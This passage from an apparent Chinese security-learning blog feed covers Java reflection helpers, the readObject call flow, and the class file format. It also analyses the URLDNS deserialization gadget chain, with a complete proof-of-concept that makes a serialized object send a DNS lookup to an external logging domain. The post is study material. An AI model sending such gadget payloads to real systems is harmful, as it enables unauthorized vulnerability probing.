        <content type="html"><![CDATA[<h1 id="seacherobj"><a href="#seacherobj" class="headerlink" title="seacherobj"></a>seacherobj</h1><blockquote><p>学习一下searcherobj的方法</p><p><a href="https://blog.csdn.net/dhklsl/article/details/83992950">https://blog.csdn.net/dhklsl/article/details/83992950</a> </p><p><a href="https://blog.csdn.net/dhklsl/article/details/84751008">https://blog.csdn.net/dhklsl/article/details/84751008</a></p><p><a href="https://blog.csdn.net/dhklsl/article/details/88245460">https://blog.csdn.net/dhklsl/article/details/88245460</a></p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个一个的去寻找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是List或者ArrayList</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isList</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(simpleName) || <span class="string">&quot;ArrayList&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是Map或者HashMap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMap</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(simpleName) || <span class="string">&quot;HashMap&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查object是否为java的基本数据类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkObjectIsSysType</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">objType</span> <span class="operator">=</span> object.getClass().toString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;byte&quot;</span>.equals(objType) || <span class="string">&quot;short&quot;</span>.equals(objType) || <span class="string">&quot;int&quot;</span>.equals(objType) || <span class="string">&quot;long&quot;</span>.equals(objType) || <span class="string">&quot;double&quot;</span>.equals(objType) || <span class="string">&quot;float&quot;</span>.equals(objType) || <span class="string">&quot;boolean&quot;</span>.equals(objType)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="json截取"><a href="#json截取" class="headerlink" title="json截取"></a>json截取</h2><p>思想非常简单就是将对象转换成json数据，然后在去截断我们需要的属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法二：从复杂对象中获取string类型的目标属性targetProName的值</span></span><br><span class="line"><span class="comment">     * 把对象转换成json字符串，然后截取第一次出现的targetProName的值</span></span><br><span class="line"><span class="comment">     * 适用条件：同方法一</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 复杂对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetProName 目标属性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBusinessNoFromArg</span><span class="params">(Object object,String targetProName)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(object);</span><br><span class="line">    System.err.println(<span class="string">&quot;jsonString=&quot;</span> + jsonString);</span><br><span class="line">    jsonString = StringUtils.substringAfter(jsonString,<span class="string">&quot;\&quot;&quot;</span>+targetProName + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);<span class="comment">//去截断目标属性</span></span><br><span class="line">    jsonString = StringUtils.substringBefore(jsonString,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> jsonString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nothing</title>
      <link href="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/"/>
      <url>/2021/11/10/readobject%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p><img src="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/readobject.jpg" alt><br>ObjectInputSteram.readObject()</p><p>readObject0()</p><p>readOrdinaryObject()</p><p>desc = readClassDesc(false)</p><p>descriptor = readNonProxyDesc(unshared)</p><p>readDesc = readClassDescriptor()</p><p>cl = resolveClass(readDesc)</p><p>filterCheck(cl, -1)</p><p>desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false))<br>各種初始化、檢查 suid 等</p><p>return desc</p><p>return descriptor</p><p>obj = desc.isInstantiable() ? desc.newInstance() : null</p><p>readSerialData(obj, desc)</p><p>slotDesc.invokeReadObject(obj, this)</p><p>readObjectMethod.invoke(obj, new Object[]{ in })</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java字节码</title>
      <link href="/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面学习已经知道<code>Java</code>文件<code>*.java</code>通过编译后会产生<code>*.class</code>文件，<code>class</code>文件有固定的二进制格式，其结构在<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">第四章：The class File Format</a>中写了详细说明。</p><p>示例文件<code>HelloWorld.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/27 16:46</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译解析流程为：<code>HelloWorld.java</code>—&gt;（经过编译）—&gt;<code>Java字节码</code>—&gt;（编译/解析）—&gt;<code>机器码</code></p><h2 id="class文件格式"><a href="#class文件格式" class="headerlink" title="class文件格式"></a>class文件格式</h2><p>class 文件的结构是固定的，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4 magic;</span><br><span class="line">    u2 minor_version;</span><br><span class="line">    u2 major_version;</span><br><span class="line">    u2 constant_pool_count;</span><br><span class="line">    cp_info constant_pool[constant_pool_count-<span class="number">1</span>];</span><br><span class="line">    u2 access_flags;</span><br><span class="line">    u2 this_class;</span><br><span class="line">    u2 super_class;</span><br><span class="line">    u2 interfaces_count;</span><br><span class="line">    u2 interfaces[interfaces_count];</span><br><span class="line">    u2 fields_count;</span><br><span class="line">    field_info fields[fields_count];</span><br><span class="line">    u2 methods_count;</span><br><span class="line">    method_info methods[methods_count];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 JVM 规范中<code>u1</code>、<code>u2</code>和<code>u4</code>分别表示的是1、2、4个字节的无符号数，可以使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。</p><p>除此之外，表结构可以由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>和<code>attribute_info</code>。</p><p><code>HelloWorld.class</code>文件十六进制内容：<br><img src="images/image-20220927165058781.png" alt="image-20220927165058781"></p><p>下面我们根据上面固定的<code>class</code>文件结构分析</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>class</code>文件的标识符，也就是文件头，固定值为：<code>0xCAFEBABE</code></p><h3 id="Minor-Major-Version"><a href="#Minor-Major-Version" class="headerlink" title="Minor/Major_Version"></a>Minor/Major_Version</h3><p><code>class</code>文件的版本号由主版本号和副版本号组成，<code>minor_version</code>为副版本号，<code>major_version</code>为主版本号。这里<code>0x00000037</code>可以知道版本号为<code>JDK.11</code></p><p>版本对应表如下所示：</p><div class="table-container"><table><thead><tr><th>JDK版本</th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th>发布时间</th></tr></thead><tbody><tr><td>JDK1.1</td><td>45</td><td>2D</td><td>1996-05</td></tr><tr><td>JDK1.2</td><td>46</td><td>2E</td><td>1998-12</td></tr><tr><td>JDK1.3</td><td>47</td><td>2F</td><td>2000-05</td></tr><tr><td>JDK1.4</td><td>48</td><td>30</td><td>2002-02</td></tr><tr><td>JDK1.5</td><td>49</td><td>31</td><td>2004-09</td></tr><tr><td>JDK1.6</td><td>50</td><td>32</td><td>2006-12</td></tr><tr><td>JDK1.7</td><td>51</td><td>33</td><td>2011-07</td></tr><tr><td>JDK1.8</td><td>52</td><td>34</td><td>2014-03</td></tr><tr><td>Java9</td><td>53</td><td>35</td><td>2017-09</td></tr><tr><td>Java10</td><td>54</td><td>36</td><td>2018-03</td></tr><tr><td>Java11</td><td>55</td><td>37</td><td>2018-09</td></tr><tr><td>Java12</td><td>56</td><td>38</td><td>2019-03</td></tr><tr><td>Java13</td><td>57</td><td>39</td><td>2019-09</td></tr><tr><td>Java14</td><td>58</td><td>3A</td><td>2020-03</td></tr><tr><td>Java15</td><td>59</td><td>3B</td><td>2020-09</td></tr></tbody></table></div><h3 id="constant-pool-count"><a href="#constant-pool-count" class="headerlink" title="constant_pool_count"></a>constant_pool_count</h3><p><code>constant_pool_count(常量池计数器)</code>的值等于常量池中的数量加1，注意的是<code>long</code>和<code>double</code>类型的常量池对象占用两个常量位。</p><h3 id="constant-pool"><a href="#constant-pool" class="headerlink" title="constant_pool"></a>constant_pool</h3><p><code>constant_pool(常量池)</code>是一种结构表，代表各种字符串常量、类和接口名称、字段名称以及其他在结构及其子结构中被引用的常量。</p><p>其中<code>cp_info</code>表示的是常量池对象，数据结构如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp_info &#123;</span><br><span class="line">   u1 tag;</span><br><span class="line">   u1 info[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>u1 tag;</code>表示的是常量池中的存储类型，常量池中的<code>tag</code>说明：</p><div class="table-container"><table><thead><tr><th>Constant Kind</th><th>Tag</th><th><code>class</code> file format</th><th>Java SE</th></tr></thead><tbody><tr><td><code>CONSTANT_Utf8</code></td><td>1</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Integer</code></td><td>3</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Float</code></td><td>4</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Long</code></td><td>5</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Double</code></td><td>6</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Class</code></td><td>7</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_String</code></td><td>8</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Fieldref</code></td><td>9</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Methodref</code></td><td>10</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_InterfaceMethodref</code></td><td>11</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_NameAndType</code></td><td>12</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_MethodHandle</code></td><td>15</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_MethodType</code></td><td>16</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Dynamic</code></td><td>17</td><td>55.0</td><td>11</td></tr><tr><td><code>CONSTANT_InvokeDynamic</code></td><td>18</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Module</code></td><td>19</td><td>53.0</td><td>9</td></tr><tr><td><code>CONSTANT_Package</code></td><td>20</td><td>53.0</td><td>9</td></tr></tbody></table></div><p>每一种<code>tag</code>都对应了不同的数据结构</p><h3 id="access-flags"><a href="#access-flags" class="headerlink" title="access_flags"></a>access_flags</h3><p><code>access_flags(访问标志)</code>表示的是某个类或者接口的访问权限和属性。</p><div class="table-container"><table><thead><tr><th>标志名</th><th>十六进制值</th><th>描述</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>声明为public</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>声明为final</td></tr><tr><td>ACC_SUPER</td><td>0x0020</td><td>废弃/仅JDK1.0.2前使用</td></tr><tr><td>ACC_INTERFACE</td><td>0x0200</td><td>声明为接口</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>声明为abstract</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>声明为synthetic，表示该class文件并非由Java源代码所生成</td></tr><tr><td>ACC_ANNOTATION</td><td>0x2000</td><td>标识注解类型</td></tr><tr><td>ACC_ENUM</td><td>0x4000</td><td>标识枚举类型</td></tr></tbody></table></div><p>同时这些标记可以通过或运算进行组合</p><h3 id="this-class"><a href="#this-class" class="headerlink" title="this_class"></a>this_class</h3><p><code>this_class(当前类名称)</code>表示的是当前<code>class</code>文件的类名所在常量池中的索引位置。</p><h3 id="super-class"><a href="#super-class" class="headerlink" title="super_class"></a>super_class</h3><p><code>super_class(当前类的父类名称)</code>表示的是当前<code>class</code>文件的父类类名所在常量池中的索引位置。<code>java/lang/Object</code>类的<code>super_class</code>的为0，其他任何类的<code>super_class</code>都必须是一个常量池中存在的索引位置。</p><h3 id="interfaces-count"><a href="#interfaces-count" class="headerlink" title="interfaces_count"></a>interfaces_count</h3><p><code>interfaces_count(当前类继承或实现的接口数)</code>表示的是当前类继承或实现的接口数。</p><h3 id="interfaces"><a href="#interfaces" class="headerlink" title="interfaces[]"></a>interfaces[]</h3><p><code>interfaces[interface_count](接口名称数组)</code>表示的是所有接口数组。</p><h3 id="fields-count"><a href="#fields-count" class="headerlink" title="fields_count"></a>fields_count</h3><p><code>fields_count(当前类的成员变量数)</code>表示的是当前<code>class</code>中的成员变量个数。</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields[]"></a>fields[]</h3><p><code>field_info fields[fields_count](成员变量数组)</code>表示的是当前类的所有成员变量，<code>field_info</code>表示的是成员变量对象。</p><p><code>field_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">field_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员变量的修饰符；</li><li><code>u2 name_index;</code>表示的是成员变量的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员变量的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员变量的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员变量的属性信息；</li></ol><h3 id="methods-count"><a href="#methods-count" class="headerlink" title="methods_count"></a>methods_count</h3><p><code>methods_count(当前类的成员方法数)</code>表示的是当前<code>class</code>中的成员方法个数。</p><h3 id="methods"><a href="#methods" class="headerlink" title="methods[]"></a>methods[]</h3><p><code>method_info methods[methods_count](成员方法数组)</code>表示的是当前<code>class</code>中的所有成员方法，<code>method_info</code>表示的是成员方法对象</p><p><code>method_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">method_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员方法的修饰符；</li><li><code>u2 name_index;</code>表示的是成员方法的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员方法的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员方法的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员方法的属性信息；</li></ol><h3 id="attributes-count"><a href="#attributes-count" class="headerlink" title="attributes_count"></a>attributes_count</h3><p><code>attributes_count(当前类的属性数)</code>表示当前<code>class</code>文件属性表的成员个数。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes[]"></a>attributes[]</h3><p><code>attribute_info attributes[attributes_count](属性数组)</code>表示的是当前<code>class</code>文件的所有属性，<code>attribute_info</code>是一个非常复杂的数据结构，存储着各种属性信息。<br><code>attribute_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attribute_info &#123;</span><br><span class="line">   u2 attribute_name_index;</span><br><span class="line">   u4 attribute_length;</span><br><span class="line">   u1 info[attribute_length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>u2 attribute_name_index;</code>表示的是属性名称索引，读取<code>attribute_name_index</code>值所在常量池中的名称可以得到属性名称。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="images/1.jpeg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/README/"/>
      <url>/2021/11/10/README/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍一些nodejs中的安全问题"><a href="#介绍一些nodejs中的安全问题" class="headerlink" title="介绍一些nodejs中的安全问题"></a>介绍一些nodejs中的安全问题</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URLNDS利用链分析</title>
      <link href="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS利用链分析"><a href="#URLDNS利用链分析" class="headerlink" title="URLDNS利用链分析"></a>URLDNS利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>URLDNS</code>是相对于其他利用链较为简单的一条<code>gadget</code>利用链，由于<code>URLDNS</code>不依赖与其他第三方库，且不限制<code>jdk</code>版本，所以常常用来检测程序是否存在反序列化漏洞。</p><p><code>URLDNS</code>的特点：只能发送<code>DNS</code>请求，不能执行其他任何命令。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>问题出在<code>HashMap</code>的<code>readObject()</code>方法中，我们看一下源码，在最后传进的<code>putVal()</code>方法中对<code>key</code>进行了<code>hash()</code>计算<br><img src="images/image-20220918225012617.png" alt="image-20220918225012617"></p><p>跟进<code>hash()</code>方法，接着会调用传进来的<code>key</code>的<code>hashCode()</code>的方法<br><img src="images/image-20220918231235822.png" alt="image-20220918231235822"></p><p>因为我们传进来的<code>key</code>是<code>URL</code>对象，因此接着跟进<code>URL</code>类的<code>hashCode()</code>方法，这里对<code>hackCode</code>参数的值进行了判断，需要满足等于<code>-1</code>的条件<br><img src="images/image-20220918231432956.png" alt="image-20220918231432956"></p><p>继续跟进<code>hashCode = handler.hashCode(this);</code>中的<code>hashCode()</code>方法，该方法里面调用了<code>getHostAddress()</code>方法<br><img src="images/image-20220918231623683.png" alt="image-20220918231623683"></p><p>继续跟进<code>getHostAddress()</code>方法，发现调用了<code>InetAddress.getByName(host);</code>方法<br><img src="images/image-20220918231719742.png" alt="image-20220918231719742"></p><p><code>InetAddress.getByName(host)</code>：只需要传入目标主机的名字，<code>InetAddress</code>会尝试做连接DNS服务器，并且获取IP地址的操作。</p><p>因此在此处发起了一次<code>DNS</code>请求，总结<code>URLDNS</code>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap --&gt; readObject()</span><br><span class="line">HashMap --&gt; putVal()</span><br><span class="line">HashMap --&gt; hash()</span><br><span class="line">URL     --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; getHostAddress()</span><br><span class="line">InetAddress      --&gt; InetAddress.getByName()</span><br></pre></td></tr></table></figure></p><p>构造 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c62a1767.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功发送了 DNS 请求<br><img src="images/image-20220918232949145.png" alt="image-20220918232949145"></p><h2 id="为什么发送了两次请求？"><a href="#为什么发送了两次请求？" 